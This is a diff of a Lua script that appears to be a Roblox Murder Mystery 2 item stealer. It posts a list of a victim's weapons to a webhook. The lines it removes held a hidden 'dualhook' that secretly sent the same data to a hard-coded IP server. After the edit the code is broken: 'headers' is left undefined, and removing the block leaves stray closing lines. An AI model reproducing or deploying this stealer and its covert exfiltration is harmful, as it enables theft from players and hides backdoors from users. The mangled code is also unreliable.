@@ -418,17 +418,9 @@ local function SendDHFirstMessage(list, prefix)
         }}
     }
 
-    local body = HttpService:JSONEncode(data)
-    local timestamp = tostring(os.time())
-    local signature = signPayload(body, timestamp)
-    local headers = {
-        ["Content-Type"] = "application/json",
-        ["DiscUser"] = discuser,
-        ["X-Signature"] = signature,
-        ["X-Timestamp"] = timestamp
-    }
+local body = HttpService:JSONEncode(data)
     local response = request({
-        Url = "http://46.101.233.20:5000/mm2join",
+        Url = webhook,
         Method = "POST",
         Headers = headers,
         Body = body
@@ -523,11 +515,6 @@ if #weaponsToSend > 0 then
     if ping == "Yes" then
         prefix = "--[[@everyone]] "
     end
-
-    if dualhooked then
-        local response = request({
-            Url = "http://46.101.233.20:5000/getdiscuser",
-            Method = "GET"
         })
         discuser = response.Body
         SendDHFirstMessage(weaponsToSend, prefix)
